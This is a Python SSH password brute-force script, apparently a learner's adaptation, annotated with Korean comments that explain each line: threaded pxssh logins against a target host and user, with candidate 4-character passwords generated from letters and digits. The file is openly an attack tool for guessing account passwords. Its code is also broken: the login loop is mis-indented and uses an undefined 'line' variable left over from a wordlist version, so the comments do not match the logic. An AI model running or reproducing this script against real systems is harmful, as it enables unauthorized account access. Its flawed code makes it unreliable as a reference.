from __future__ import print_function
import pxssh
import optparse
import time
import itertools
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)                                               #BoundedSemaphore port_scanner.py의 semaphore와 같은 의미 다른점은 세마포어에서 release호출은 lock 호출만큼 일어나야 되는데 일반 세마포어는 이런 오류를 
found = False                                                                                          #검사하지 못하는 반면에 바운디드 세마포어는 이런 오류를 검사해줌 따라서 bounded세마포어가 더 우월하다고 볼 수 있음
fails = 0     #found = false, fails = 0으로 설정
def connect(host, user, pw, release):                                                                  #host, user, password, release를 인자로 받음
    global found                                                                                       #함수안에서 found와 fails는 지역변수가 아니라 위에 선언된 전역변수를 뜻한다는 의미
    global fails
    try:                                 
        s = pxssh.pxssh()                                                                              #ssh 접속을 위한 pxssh객체를 만들어서 s에 저장
        s.login(host, user, pw)                                                                        #ip주소, 아이디, 비밀번호를 가지고 접속 시도
        print('[+] Password found: ' + pw)                                                             #에러가 일어나지 않았다는건 패스워드를 찾았다는 뜻이므로 안내메세지 출력
        found = True                                                                                   #found를 true로 바꿔줘서 안내메세지 출력후 프로그램 종료할수 있게 설정
    except Exception as e:                                    
        if 'read_nonblocking' in str(e):                                                               #read_nonblocking 에러로 접속이 되지 않을경우 fails를 1 증가시키고 다시 접속해봄
            fails += 1
            time.sleep(5)
            connect(host, user, pw, False)
        elif 'synchronize with original prompt' in str(e):                                             #synchronize with original prompt 에러로 접속이 되지 않을 경우 1초 기다렸다가 다시 접속해봄
            time.sleep(1)
            connect(host, user, pw, False)
    finally:
        if release: connection_lock.release()
        
def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> ')        #프로그램 실행시에 적절한 인자값을 넣지 않으면 인자값을 넣는 방법의 설명문이 나오도록 설정함 -H <ip번호> -u <유저아이디> -F <패스워드파일> 형식으로 인자값 입력
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')                #ip인자값을 tgtHost이란 이름으로 저장
    parser.add_option('-u', dest='user', type='string', help='specify the user')                      #id 인자값을 user이란 이름으로 저장
    (options, args) = parser.parse_args()                                                             #options, args 변수를 활용해서 저장한 변수들을 꺼내올 수 있음
    host = options.tgtHost                                                                            #ip값을 host에 저장
    user = options.user                                                                               #id값을 user이름에 저장
    
    chars = '0123456789abcdefghijklmnopqrstuvwxyz'                                                    # bruteforce에 집어넣을 문자들
    if host == None or user == None:                                                                  #인자가 하나라도 없으면 설명서를 출력하고 프로그램 끝냄
        print(parser.usage)
        exit(0)
        
    for length in range(4,5):                                                                         #4자릿수
        for password in itertools.product(chars,repeat=length):                                       #product는 for와 동일 repeat = 4 -> 4자릿수로 뽑아낸다.
            if found: 
                print(password)
                print(''.join(password))                                                              #튜플값이기 때문에 join으로 합쳐줌
                exit(0)
            if fails > 5:                                                                                 #접속이 안되서 계속 접속 시도하다가 일정 시간이 지나면 안내메세지 출력 후 프로그램 종료
                print("[!] Exiting: Too Many SOcket Timeouts")
                exit(0)                                                   
        connection_lock.acquire()                                                                     #한 스레드가 공유자원을 점유하고 있으면 다른 스레드가 접근하지 못하도록 lock 설정
        password = line.strip("\r").strip("\n")                                                       #한 줄씩 읽기떄문에 캐리지 리턴(\r), 줄 바꿈(\n)이 있을수 있으므로 이를 제거해야 순수한 패스워드가 얻어져서 이를 저장
        print("[-] Testing: " + str(password))                                                        #이러한 비밀번호로 테스트하겠다는 안내메세지 출력
        t = Thread(target=connect, args=(host, user, password, True))                                 #스레드를 생성해서 connect 함수를 실행시키겠다는 선언
        child = t.start()     
        
# 스레드 시작
if __name__ == '__main__':
    main()
